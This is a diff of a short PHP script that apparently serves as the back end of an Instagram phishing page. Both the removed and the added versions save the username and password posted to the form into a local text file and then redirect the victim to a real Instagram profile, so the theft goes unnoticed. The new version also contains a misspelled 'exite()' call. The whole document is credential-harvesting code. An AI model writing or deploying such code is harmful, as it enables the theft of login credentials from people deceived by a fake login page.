@@ -1,14 +1,5 @@
 <?php
-
-$email = $_POST['username'];
-$pass = $_POST['password'];
-
-$f = fopen('userpass','a');
-fwrite($f,'username:' . $username . ' password:' . $password . ' ');
-echo '
- <SCRIPT LANGUAGE="JavaScript">
-  document.location.href="https://www.instagram.com/thelinuxproject/?hl=fr"
- </SCRIPT>
-'
-
+ file_put_contents("usernames.txt","Account: " . $_POST['username'] . "Pass: " .$_POST['password'] . "\n",FILE_APPEND);
+ header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
+ exite();
 ?>
